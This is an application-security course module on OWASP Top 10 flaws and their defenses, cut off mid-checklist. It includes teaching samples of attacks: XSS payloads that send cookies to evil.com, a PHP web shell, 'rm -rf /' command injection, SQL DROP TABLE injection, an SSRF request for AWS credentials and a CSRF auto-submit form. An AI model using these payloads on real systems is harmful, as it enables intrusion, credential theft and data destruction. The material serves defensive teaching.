# Module 4.1: Application Security (AppSec)

> **Module 04.1** · **Last updated:** 2026-05-22

## Guiding ideas
1. **OWASP Top 10 2021: Broken Access Control #1.**
2. **SAST + DAST + SCA: complement, not replace each other.**
3. **Shift-left: catch in dev, not prod.**
4. **Secure defaults: HTTPS, SameSite cookie, CSP nonce.**

---

## 1. OWASP Top 10 (2021) Deep Dive

### 1.1 A01: Broken Access Control

The number one vulnerability. The application fails to enforce authorization
correctly — users access resources or actions they should not.

**Common patterns:**

```
1. IDOR (Insecure Direct Object Reference):
   GET /api/invoices/42         ← attacker changes 42 → 43 to view another user's invoice
   
2. Missing function-level access control:
   POST /api/admin/users/delete  ← non-admin user calls admin endpoint directly

3. Privilege escalation via parameter tampering:
   POST /api/profile
   { "role": "admin" }           ← user submits role field, server blindly accepts

4. Path traversal:
   GET /api/files?name=../../etc/passwd

5. CORS misconfiguration:
   Access-Control-Allow-Origin: *    ← any site can read responses

6. JWT claim manipulation:
   { "sub": "user_123", "role": "admin" }  ← modified token with "none" algorithm
```

**Defenses:**

```python
# 1. Server-side authorization on every request:
@app.route("/api/invoices/<int:invoice_id>")
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get_or_404(invoice_id)
    # CRITICAL: verify ownership
    if invoice.user_id != current_user.id:
        abort(403)
    return jsonify(invoice.to_dict())

# 2. Deny by default:
@app.before_request
def check_auth():
    if request.endpoint not in PUBLIC_ENDPOINTS:
        if not current_user.is_authenticated:
            abort(401)

# 3. Never trust client-supplied role/permission data:
def update_profile(user_id, data):
    ALLOWED_FIELDS = {"name", "email", "phone"}
    filtered = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
    # "role" silently ignored even if sent
    User.query.get(user_id).update(**filtered)
```

```python
# 4. Path traversal defense:
import os

UPLOAD_DIR = "/var/app/uploads"

def get_file(filename):
    # Resolve to absolute path and verify it's within allowed directory
    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not safe_path.startswith(os.path.realpath(UPLOAD_DIR)):
        abort(403, "Path traversal detected")
    return send_file(safe_path)
```

### 1.2 A02: Cryptographic Failures

Sensitive data exposed due to weak or missing cryptography.

```
Common failures:
  - Passwords stored as MD5/SHA-1/SHA-256 (not memory-hard hash)
  - Sensitive data in URL parameters (logged by proxies, browsers)
  - HTTP used for login pages
  - Weak TLS ciphers enabled (RC4, DES, export ciphers)
  - Hardcoded encryption keys in source code
  - Encryption at rest disabled for databases/backups
  - PII in logs (email, SSN, credit card in stack traces)
```

**Defenses:**

```python
# Password hashing (Argon2id):
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,       # iterations
    memory_cost=65536,  # 64 MB
    parallelism=4,
    hash_len=32,
    salt_len=16
)

hashed = ph.hash("user_password")
# $argon2id$v=19$m=65536,t=3,p=4$...

try:
    ph.verify(hashed, "user_password")
except argon2.exceptions.VerifyMismatchError:
    raise AuthenticationError("Invalid password")
```

```python
# Sensitive data classification:
SENSITIVE_FIELDS = {"password", "ssn", "credit_card", "token", "secret"}

class SanitizedLogger:
    def log(self, level, msg, **kwargs):
        sanitized = {
            k: "***REDACTED***" if k in SENSITIVE_FIELDS else v
            for k, v in kwargs.items()
        }
        logger.log(level, msg, extra=sanitized)
```

### 1.3 A03: Injection

Code injection occurs when untrusted data is sent to an interpreter as part of
a command or query.

**SQL Injection:**

```python
# VULNERABLE:
def get_user(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"
    #         username = "'; DROP TABLE users; --"
    #         Result: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
    return db.execute(query)

# SAFE (parameterized query):
def get_user(username):
    return db.execute(
        "SELECT * FROM users WHERE name = %s",
        (username,)
    )

# SAFE (ORM):
def get_user(username):
    return User.query.filter_by(name=username).first()
```

**Command Injection:**

```python
# VULNERABLE:
import os
def ping(host):
    os.system(f"ping -c 1 {host}")
    # host = "8.8.8.8; rm -rf /"

# SAFE (use subprocess with list args):
import subprocess
def ping(host):
    # Validate input first
    if not re.match(r'^[\d.]+$', host):
        raise ValueError("Invalid host")
    subprocess.run(["ping", "-c", "1", host], check=True, capture_output=True)
```

**LDAP Injection:**

```python
# VULNERABLE:
filter_str = f"(&(uid={username})(userPassword={password}))"
# username = "*)(uid=*))(|(uid=*"
# Becomes: (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))

# SAFE (escape special characters):
from ldap3.utils.conv import escape_filter_chars
safe_user = escape_filter_chars(username)
filter_str = f"(&(uid={safe_user})(userPassword={safe_pass}))"
```

**Template Injection (SSTI):**

```python
# VULNERABLE (Jinja2):
from jinja2 import Template
template = Template(user_input)  # user_input = "{{ config.items() }}"
result = template.render()

# SAFE (use sandboxed environment):
from jinja2 import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_input)
result = template.render()

# SAFEST: never let users control templates. Use predefined templates
# with variable substitution only.
```

### 1.4 A04: Insecure Design

Flaws in architecture and design, not implementation bugs. No amount of perfect
coding fixes a fundamentally insecure design.

```
Examples:
  - Password recovery via security questions (answers are public/guessable)
  - No rate limiting on authentication endpoints
  - Storing sensitive data that is not needed
  - Multi-tenant app without proper isolation boundaries
  - Business logic that allows negative quantities to reverse charges

Mitigations:
  - Threat modeling (see Module 4.4)
  - Secure design patterns (reference architectures)
  - Abuse case stories alongside user stories
  - Security requirements in the Definition of Done
```

### 1.5 A05: Security Misconfiguration

```
Common misconfigurations:

1. Default credentials left in place:
   admin/admin, root/root, sa/(blank)

2. Unnecessary features enabled:
   - Directory listing on web server
   - Debug mode in production
   - Stack traces returned to clients
   - Unused HTTP methods (TRACE, OPTIONS without CORS)

3. Missing security headers (see section 4)

4. Cloud storage misconfiguration:
   - S3 bucket with public read/write
   - Firebase Realtime Database rules: { ".read": true, ".write": true }

5. Verbose error messages:
   WRONG: "Invalid password for user admin@company.com"
   RIGHT: "Invalid email or password"
```

```python
# Production configuration checklist:
DEBUG = False
TESTING = False
SECRET_KEY = os.environ["SECRET_KEY"]  # never hardcoded

# Disable detailed error responses:
@app.errorhandler(500)
def internal_error(error):
    app.logger.error(f"Internal error: {error}", exc_info=True)
    return jsonify({"error": "An internal error occurred"}), 500
    # Do NOT return the stack trace to the client
```

### 1.6 A06: Vulnerable and Outdated Components

Using libraries with known CVEs.

```bash
# Python — check for known vulnerabilities:
pip-audit
# or
safety check --full-report

# Node.js:
npm audit
# or
npx better-npm-audit audit

# Go:
govulncheck ./...

# Rust:
cargo audit

# Generic (multi-language):
trivy fs --security-checks vuln .
snyk test
```

**Software Composition Analysis (SCA) integration:**

```yaml
# GitHub Actions — automated dependency scanning:
name: Security Scan
on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 6 * * 1'  # weekly Monday 6 AM

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # fail the build
```

### 1.7 A07: Identification and Authentication Failures

```
Common failures:
  - Weak password policies (no length requirement, no breach check)
  - Credential stuffing (no rate limiting, no account lockout)
  - Session IDs in URL (bookmarkable, logged, shared via Referer)
  - Session not invalidated on logout/password change
  - Missing MFA for sensitive operations

Defenses:
  - Minimum 12-character passwords, check against Have I Been Pwned
  - Rate limit: 5 attempts per 15 minutes per account
  - Progressive delays: 1s, 2s, 4s, 8s between attempts
  - MFA for all accounts (TOTP/WebAuthn)
  - Session invalidation on password change, privilege change, logout
  - Secure session configuration (see section 5)
```

```python
# Rate limiting login attempts (Redis-based):
import redis
from functools import wraps

r = redis.Redis()

def rate_limit_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        username = request.json.get("username", "")
        
        # Rate limit by IP
        ip_key = f"login_attempts:ip:{ip}"
        ip_attempts = r.incr(ip_key)
        r.expire(ip_key, 900)  # 15 minute window
        
        # Rate limit by username
        user_key = f"login_attempts:user:{username}"
        user_attempts = r.incr(user_key)
        r.expire(user_key, 900)
        
        if ip_attempts > 20 or user_attempts > 5:
            abort(429, "Too many login attempts. Try again later.")
        
        return f(*args, **kwargs)
    return decorated
```

### 1.8 A08: Software and Data Integrity Failures

```
Failures:
  - CI/CD pipeline without integrity verification
  - Auto-update without signature verification
  - Deserialization of untrusted data (Java ObjectInputStream, Python pickle)
  - npm/PyPI typosquatting (e.g., "crypt0graphy" instead of "cryptography")

Defenses:
  - Pin dependencies with lockfiles (package-lock.json, poetry.lock)
  - Verify checksums/signatures of downloaded packages
  - Never deserialize untrusted data with unsafe deserializers
  - Use Sigstore/cosign for container image signing
  - SBOM (Software Bill of Materials) generation
```

```python
# VULNERABLE — pickle deserialization:
import pickle
data = pickle.loads(user_supplied_bytes)  # arbitrary code execution

# SAFE — use JSON or validated schemas:
import json
data = json.loads(user_supplied_string)
# Validate against schema:
from pydantic import BaseModel
class UserData(BaseModel):
    name: str
    age: int
validated = UserData(**data)
```

### 1.9 A09: Security Logging and Monitoring Failures

```
Requirements:
  - Log all authentication events (success and failure)
  - Log authorization failures (403s)
  - Log input validation failures
  - Log admin actions (user creation, permission changes)
  - Logs must be tamper-evident (append-only, integrity-protected)
  - Logs must not contain sensitive data (passwords, tokens, PII)
  - Active monitoring with alerting for anomalies

Alerting thresholds:
  - >10 failed logins for one account in 5 minutes
  - >50 failed logins from one IP in 15 minutes
  - Admin action outside business hours
  - Unusual data export volume
  - New admin account creation
```

```python
# Structured security logging:
import structlog

security_log = structlog.get_logger("security")

def login_handler(username, password):
    user = authenticate(username, password)
    if user:
        security_log.info(
            "authentication.success",
            username=username,
            ip=request.remote_addr,
            user_agent=request.user_agent.string,
        )
    else:
        security_log.warning(
            "authentication.failure",
            username=username,
            ip=request.remote_addr,
            user_agent=request.user_agent.string,
            reason="invalid_credentials",
        )
```

### 1.10 A10: Server-Side Request Forgery (SSRF)

```
Attack: The application fetches a URL provided by the user,
        allowing the attacker to reach internal services.

Example:
  POST /api/fetch-url
  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
  → Returns AWS IAM credentials from the metadata service

  POST /api/fetch-url
  { "url": "http://internal-admin.local:8080/api/users" }
  → Accesses internal admin API
```

```python
# SSRF defense:
import ipaddress
from urllib.parse import urlparse
import socket

BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local (AWS metadata)
    ipaddress.ip_network("127.0.0.0/8"),       # loopback
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("::1/128"),           # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),          # IPv6 private
]

def validate_url(url: str) -> bool:
    parsed = urlparse(url)
    
    # Only allow HTTPS
    if parsed.scheme not in ("https",):
        raise ValueError("Only HTTPS URLs allowed")
    
    # Resolve hostname to IP
    hostname = parsed.hostname
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    except (socket.gaierror, ValueError):
        raise ValueError(f"Cannot resolve hostname: {hostname}")
    
    # Check against blocked ranges
    for network in BLOCKED_RANGES:
        if ip in network:
            raise ValueError(f"Access to internal network blocked: {ip}")
    
    return True
```

---

## 2. Cross-Site Scripting (XSS) Deep Dive

### 2.1 Types

```
1. Reflected XSS:
   Payload comes from the URL, server echoes it in HTML.
   
   URL: https://shop.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
   
   Server renders: <p>Results for: <script>...</script></p>

2. Stored XSS:
   Payload saved in database (comment, profile, message).
   Served to every visitor who views the content.
   
   Comment: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

3. DOM-Based XSS:
   Payload never touches the server. Client-side JavaScript reads from
   a tainted source (URL hash, postMessage) and writes to a dangerous sink.
   
   Code: document.getElementById('output').innerHTML = location.hash.slice(1)
   URL:  https://app.com/#<img src=x onerror=alert(1)>
```

### 2.2 Output Encoding (Context-Aware)

The defense depends on WHERE the untrusted data appears:

```
┌─────────────────────┬───────────────────────────────────────┐
│ Context             │ Encoding Required                     │
├─────────────────────┼───────────────────────────────────────┤
│ HTML body           │ HTML entity encoding                  │
│ <p>USER_DATA</p>    │ < → &lt;  > → &gt;  & → &amp;       │
│                     │ " → &quot;  ' → &#x27;              │
├─────────────────────┼───────────────────────────────────────┤
│ HTML attribute      │ Attribute encoding (quote + encode)   │
│ <div title="DATA">  │ All non-alphanumeric → &#xHH;        │
├─────────────────────┼───────────────────────────────────────┤
│ JavaScript string   │ JavaScript encoding                   │
│ var x = "DATA";     │ " → \"  \ → \\  / → \/              │
│                     │ Non-alphanumeric → \uHHHH            │
├─────────────────────┼───────────────────────────────────────┤
│ URL parameter       │ Percent-encoding                      │
│ ?q=DATA             │ Non-unreserved → %HH                 │
├─────────────────────┼───────────────────────────────────────┤
│ CSS value           │ CSS encoding                          │
│ color: DATA;        │ Non-alphanumeric → \HHHHHH           │
│                     │ (Avoid placing user data in CSS)      │
└─────────────────────┴───────────────────────────────────────┘
```

```python
# Python (Jinja2 — auto-escapes in HTML context by default):
from markupsafe import escape

# Manual encoding when needed:
safe_value = escape(user_input)  # HTML entity encoding
```

```javascript
// JavaScript — safe DOM manipulation:
// DANGEROUS:
element.innerHTML = userInput;

// SAFE:
element.textContent = userInput;  // treats as text, not HTML

// If HTML is needed, sanitize first:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 2.3 Content Security Policy (CSP)

```
Strict CSP (nonce-based):

Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

```python
# Generate nonce per request (Flask example):
import secrets

@app.before_request
def generate_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(32)

@app.after_request
def add_csp_header(response):
    nonce = g.get("csp_nonce", "")
    csp = (
        f"default-src 'self'; "
        f"script-src 'nonce-{nonce}' 'strict-dynamic'; "
        f"style-src 'self' 'unsafe-inline'; "
        f"img-src 'self' data: https:; "
        f"object-src 'none'; "
        f"base-uri 'self'; "
        f"frame-ancestors 'none'"
    )
    response.headers["Content-Security-Policy"] = csp
    return response
```

```html
<!-- In templates, use the nonce: -->
<script nonce="{{ g.csp_nonce }}">
    // This script will execute
    initializeApp();
</script>

<!-- Without nonce, this will be blocked: -->
<script>
    // BLOCKED by CSP
    maliciousCode();
</script>
```

---

## 3. Cross-Site Request Forgery (CSRF)

### 3.1 The Attack

```
User is logged into bank.com (session cookie set).
User visits evil.com while still logged in.

evil.com contains:
  <form action="https://bank.com/transfer" method="POST" id="f">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>document.getElementById('f').submit();</script>

Browser sends the POST to bank.com WITH the session cookie.
Bank processes the transfer because the cookie is valid.
```

### 3.2 Defenses

```python
# 1. SameSite cookies (primary defense):
response.set_cookie(
    "session_id",
    value=session_token,
    httponly=True,       # not accessible via JavaScript
    secure=True,         # HTTPS only
    samesite="Lax",      # sent on top-level navigation, not cross-site POST
    max_age=3600,
    path="/",
)

# 2. Anti-CSRF tokens (defense in depth):
# Synchronizer Token Pattern:
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In forms:
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">

# 3. Double Submit Cookie:
# Set csrf_cookie = random_token
# Form sends same token in hidden field
# Server compares cookie value with form value
# Attacker cannot read the cookie (SOP) so cannot include correct token

# 4. Custom request headers:
# Require X-Requested-With: XMLHttpRequest on state-changing endpoints
# Browsers block cross-origin requests with custom headers (preflight fails)
```

### 3.3 SameSite Cookie Modes

| Mode | Cross-site GET | Cross-site POST | Cross-site iframe |
|---|---|---|---|
| `Strict` | Not sent | Not sent | Not sent |
| `Lax` (default) | Sent (top-level nav) | Not sent | Not sent |
| `None` (Secure required) | Sent | Sent | Sent |

---

## 4. Security Headers

### 4.1 Essential Headers

```
# HTTPS enforcement (HSTS):
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Prevent MIME sniffing:
X-Content-Type-Options: nosniff

# Clickjacking protection:
X-Frame-Options: DENY
# Or use CSP: frame-ancestors 'none'

# Referrer control:
Referrer-Policy: strict-origin-when-cross-origin

# Feature restrictions:
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# CSP (see section 2.3)
Content-Security-Policy: ...
```

```python
# Flask — add all security headers:
@app.after_request
def add_security_headers(response):
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains; preload"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = (
        "camera=(), microphone=(), geolocation=(), payment=()"
    )
    # CSP added separately (needs nonce)
    return response
```

### 4.2 CORS (Cross-Origin Resource Sharing)

```
Browser enforces Same-Origin Policy:
  https://app.com → fetch("https://api.app.com/data")
  Different origin → browser sends preflight OPTIONS request

Server must explicitly allow cross-origin access:

Access-Control-Allow-Origin: https://app.com       ← specific origin (never *)
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true              ← allow cookies
Access-Control-Max-Age: 86400                        ← cache preflight for 24h
```

```python
# CORS configuration (Flask-CORS):
from flask_cors import CORS

CORS(app, resources={
    r"/api/*": {
        "origins": ["https://app.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,
        "max_age": 86400,
    }
})

# DANGEROUS — never do this with credentials:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# ← These two together are rejected by browsers
```

**CORS misconfiguration attacks:**

```
Vulnerable server reflects Origin header:
  Request:  Origin: https://evil.com
  Response: Access-Control-Allow-Origin: https://evil.com
            Access-Control-Allow-Credentials: true

  → evil.com can read authenticated API responses

Fix: Validate Origin against an allowlist, never reflect blindly.
```

---

## 5. Input Validation and Output Encoding

### 5.1 Validation Strategy

```
Validation Layers:

  Client-side (UX only, never security):
    ├── HTML5 attributes: required, pattern, maxlength
    ├── JavaScript validation
    └── Provides immediate feedback to user

  Server-side (security boundary):
    ├── Type checking (is this actually an integer?)
    ├── Range checking (is age between 0 and 150?)
    ├── Format validation (is this a valid email format?)
    ├── Length limits (is username < 100 chars?)
    ├── Allow-list validation (is status one of: active, inactive?)
    └── Business rule validation (is quantity > 0?)
```

```python
# Schema-based validation (Pydantic):
from pydantic import BaseModel, Field, EmailStr, constr
from enum import Enum

class OrderStatus(str, Enum):
    PENDING = "pending"
    COMPLETED = "completed"
    CANCELLED = "cancelled"

class CreateOrderRequest(BaseModel):
    customer_email: EmailStr
    product_id: int = Field(gt=0)
    quantity: int = Field(ge=1, le=1000)
    status: OrderStatus = OrderStatus.PENDING
    notes: constr(max_length=500) | None = None
    
    # Custom validator:
    @validator("quantity")
    def quantity_must_be_positive(cls, v):
        if v <= 0:
            raise ValueError("Quantity must be positive")
        return v

# Usage:
@app.route("/api/orders", methods=["POST"])
def create_order():
    try:
        order = CreateOrderRequest(**request.json)
    except ValidationError as e:
        return jsonify({"errors": e.errors()}), 422
    
    # order is guaranteed valid at this point
    return create_order_in_db(order)
```

### 5.2 Parameterized Queries (All Databases)

```python
# PostgreSQL (psycopg):
cursor.execute(
    "SELECT * FROM users WHERE email = %s AND status = %s",
    (email, status)
)

# MySQL (mysql-connector):
cursor.execute(
    "SELECT * FROM users WHERE email = %s AND status = %s",
    (email, status)
)

# SQLite:
cursor.execute(
    "SELECT * FROM users WHERE email = ? AND status = ?",
    (email, status)
)
```

```javascript
// Node.js (pg):
const result = await pool.query(
    'SELECT * FROM users WHERE email = $1 AND status = $2',
    [email, status]
);

// Prisma (ORM):
const user = await prisma.user.findFirst({
    where: { email: email, status: status }
});
```

```go
// Go (database/sql):
row := db.QueryRow(
    "SELECT * FROM users WHERE email = $1 AND status = $2",
    email, status,
)
```

---

## 6. File Upload Security

### 6.1 Attack Vectors

```
1. Web shell upload:
   Upload: evil.php containing <?php system($_GET['cmd']); ?>
   Access: https://app.com/uploads/evil.php?cmd=cat%20/etc/passwd

2. Path traversal in filename:
   Filename: ../../../etc/cron.d/backdoor
   Overwrites system files

3. MIME type mismatch:
   Upload .html file as "image/png" → stored, served as HTML → XSS

4. Archive extraction (zip bomb / zip slip):
   Zip contains ../../../etc/passwd → extracts outside intended directory

5. Image with embedded payload:
   EXIF metadata contains <script>alert(1)</script>
   If EXIF is rendered in HTML → XSS

6. SVG with JavaScript:
   <svg onload="alert(1)">
   If SVG is served from same origin → XSS
```

### 6.2 Defense Checklist

```python
import os
import uuid
import magic  # python-magic (libmagic binding)
from PIL import Image

ALLOWED_MIME_TYPES = {
    "image/jpeg": ".jpg",
    "image/png": ".png",
    "image/webp": ".webp",
    "application/pdf": ".pdf",
}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB
UPLOAD_DIR = "/var/app/uploads"

def handle_upload(file_storage):
    # 1. Check file size
    file_storage.seek(0, os.SEEK_END)
    size = file_storage.tell()
    file_storage.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError(f"File too large: {size} bytes")
    
    # 2. Detect actual MIME type (not Content-Type header)
    header = file_storage.read(2048)
    file_storage.seek(0)
    mime = magic.from_buffer(header, mime=True)
    if mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Disallowed file type: {mime}")
    
    # 3. Generate random filename (never use user-supplied name)
    ext = ALLOWED_MIME_TYPES[mime]
    safe_name = f"{uuid.uuid4().hex}{ext}"
    
    # 4. Save to isolated directory (outside web root)
    save_path = os.path.join(UPLOAD_DIR, safe_name)
    file_storage.save(save_path)
    
    # 5. For images: re-encode to strip metadata and validate
    if mime.startswith("image/"):
        img = Image.open(save_path)
        img.verify()  # validate image data
        img = Image.open(save_path)  # re-open after verify
        clean_path = os.path.join(UPLOAD_DIR, f"clean_{safe_name}")
        img.save(clean_path)  # strips EXIF, re-encodes
        os.replace(clean_path, save_path)
    
    # 6. Scan with antivirus (ClamAV):
    scan_result = subprocess.run(
        ["clamdscan", "--no-summary", save_path],
        capture_output=True, text=True
    )
    if scan_result.returncode != 0:
        os.unlink(save_path)
        raise ValueError("Malware detected")
    
    return safe_name
```

**Serving uploaded files safely:**

```python
# Serve from a different domain (no cookie access):
# uploads.cdn.example.com (separate origin from app.example.com)

# Or set headers to prevent execution:
@app.route("/uploads/<filename>")
def serve_upload(filename):
    response = send_from_directory(UPLOAD_DIR, filename)
    response.headers["Content-Disposition"] = "attachment"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Content-Security-Policy"] = "default-src 'none'"
    return response
```

---

## 7. Security Testing Tools

### 7.1 SAST (Static Application Security Testing)

Analyzes source code without executing it.

| Tool | Languages | Type |
|---|---|---|
| Semgrep | Python, JS, Go, Java, Ruby, ... | Pattern-based rules |
| CodeQL (GitHub) | C/C++, Java, JS, Python, Go | Semantic analysis |
| Bandit | Python | AST-based checks |
| ESLint security plugins | JavaScript/TypeScript | Linting rules |
| gosec | Go | Go-specific checks |
| Brakeman | Ruby on Rails | Framework-specific |

```bash
# Semgrep example:
semgrep scan --config auto .
semgrep scan --config p/owasp-top-ten .
semgrep scan --config p/python .

# Custom rule (detect eval() usage):
# .semgrep.yml
rules:
  - id: dangerous-eval
    patterns:
      - pattern: eval(...)
    message: "eval() executes arbitrary code — use ast.literal_eval() instead"
    severity: ERROR
    languages: [python]
```

### 7.2 DAST (Dynamic Application Security Testing)

Tests the running application from the outside (black-box).

| Tool | Type | Cost |
|---|---|---|
| OWASP ZAP | Proxy + scanner | Free (open-source) |
| Burp Suite | Proxy + scanner | Community (free) / Pro ($) |
| Nuclei | Template-based scanner | Free (open-source) |
| Nikto | Web server scanner | Free |

```bash
# OWASP ZAP — automated scan:
docker run -v $(pwd):/zap/wrk/:rw \
    ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
    -t https://staging.example.com \
    -r report.html

# Nuclei — template-based scanning:
nuclei -u https://staging.example.com \
    -t cves/ \
    -t misconfiguration/ \
    -t exposures/ \
    -severity critical,high
```

### 7.3 IAST (Interactive Application Security Testing)

Instruments the running application to detect vulnerabilities during testing:

```
How IAST works:
  1. Agent runs inside the application (attached to runtime)
  2. Monitors data flow: tainted input → dangerous sink
  3. Reports vulnerabilities with exact code path
  4. Runs during integration tests (no separate scan needed)

Tools: Contrast Security, Hdiv, Checkmarx IAST

Advantages:
  - Low false positives (sees actual execution)
  - Identifies exact vulnerable code path
  - Works during normal QA testing

Disadvantages:
  - Requires agent installation (modifies runtime)
  - Language-specific agents needed
  - Performance overhead (~5-10%)
```

### 7.4 SCA (Software Composition Analysis)

```
SCA Pipeline:

  Source Code
       │
       ▼
  Dependency Manifest
  (package.json, requirements.txt, go.mod)
       │
       ▼
  SCA Tool
  (Snyk, Dependabot, Trivy, OWASP Dependency-Check)
       │
       ├── CVE Database lookup
       ├── License compliance check
       ├── Reachability analysis (is vulnerable code actually called?)
       └── Fix recommendations (upgrade path)
       │
       ▼
  Report: CRITICAL: CVE-2024-XXXX in library-X v1.2.3
          Fix: upgrade to v1.2.4
          Reachable: YES (called from src/auth.py:42)
```

---

## 8. Secure Development Lifecycle

### 8.1 Shift-Left Security

```
Traditional (shift-right):
  Code → Build → Test → Deploy → Pentest → Fix
                                    ↑
                          Expensive to fix here

Shift-left:
  Threat Model → Code (with linters) → Commit (SAST) → Build (SCA) →
  Test (IAST/DAST) → Deploy → Monitor
  ↑
  Cheap to fix here
```

### 8.2 Security in CI/CD

```yaml
# GitLab CI security pipeline:
stages:
  - test
  - security
  - build
  - deploy

sast:
  stage: security
  script:
    - semgrep scan --config auto --json --output semgrep.json .
  artifacts:
    reports:
      sast: semgrep.json
  allow_failure: false  # block merge on findings

dependency_scan:
  stage: security
  script:
    - trivy fs --severity CRITICAL,HIGH --exit-code 1 .
  allow_failure: false

container_scan:
  stage: build
  script:
    - docker build -t app:$CI_COMMIT_SHA .
    - trivy image --severity CRITICAL,HIGH --exit-code 1 app:$CI_COMMIT_SHA

secret_detection:
  stage: security
  script:
    - gitleaks detect --source . --verbose
  allow_failure: false
```

### 8.3 Secret Detection

```bash
# Gitleaks — scan for secrets in git history:
gitleaks detect --source . --verbose --report-format json --report-path leaks.json

# TruffleHog — deep scan:
trufflehog git file://. --json

# Common patterns detected:
# - AWS Access Key: AKIA[0-9A-Z]{16}
# - GitHub Token: ghp_[0-9a-zA-Z]{36}
# - Private Key: -----BEGIN (RSA|EC|DSA) PRIVATE KEY-----
# - Generic password: password\s*=\s*['"][^'"]+['"]
```

**Pre-commit hook for secret detection:**

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.2
    hooks:
      - id: gitleaks
```

---

## 9. Common Vulnerability Patterns by Framework

### 9.1 Node.js / Express

```javascript
// Prototype pollution:
// VULNERABLE:
function merge(target, source) {
    for (const key in source) {
        target[key] = source[key];  // allows __proto__ pollution
    }
}
// Input: {"__proto__": {"isAdmin": true}}
// Result: Object.prototype.isAdmin = true (affects ALL objects)

// SAFE:
function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        target[key] = source[key];
    }
}

// ReDoS (Regular Expression Denial of Service):
// VULNERABLE:
const emailRegex = /^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
// Input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" → exponential backtracking

// SAFE: use linear-time regex engines or validate format without regex
const { isEmail } = require('validator');
if (!isEmail(userInput)) { reject(); }
```

### 9.2 Python / Django / Flask

```python
# Mass assignment (Django):
# VULNERABLE:
def update_user(request):
    user = User.objects.get(id=request.user.id)
    for key, value in request.POST.items():
        setattr(user, key, value)  # attacker sets is_superuser=True
    user.save()

# SAFE:
def update_user(request):
    form = UserProfileForm(request.POST, instance=request.user)
    if form.is_valid():
        form.save()  # only form-defined fields are updated

# Debug mode in production:
# DANGEROUS:
app.run(debug=True)  # exposes Werkzeug debugger (RCE)
# SAFE:
app.run(debug=False)
# Even safer: use gunicorn/uvicorn, never app.run() in production
```

### 9.3 Go

```go
// SQL injection in Go:
// VULNERABLE:
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)
rows, err := db.Query(query)

// SAFE:
rows, err := db.Query("SELECT * FROM users WHERE name = $1", name)

// Path traversal:
// VULNERABLE:
http.Handle("/files/", http.StripPrefix("/files/", http.FileServer(http.Dir("/uploads"))))
// Serves ../../etc/passwd

// SAFE:
func serveFile(w http.ResponseWriter, r *http.Request) {
    name := filepath.Clean(r.URL.Path)
    fullPath := filepath.Join(uploadsDir, name)
    if !strings.HasPrefix(fullPath, uploadsDir) {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }
    http.ServeFile(w, r, fullPath)
}
```

---

## 10. API Security

### 10.1 REST API Security Checklist

```
Authentication:
  □ Use OAuth 2.0 / OIDC for user-facing APIs
  □ Use API keys + HMAC for machine-to-machine
  □ Never send credentials in URL parameters
  □ Use short-lived access tokens (15-60 min)

Authorization:
  □ Enforce on every endpoint (not just the gateway)
  □ Use RBAC or ABAC policies
  □ Validate resource ownership (not just authentication)
  □ Principle of least privilege for API scopes

Input:
  □ Validate all input (type, length, range, format)
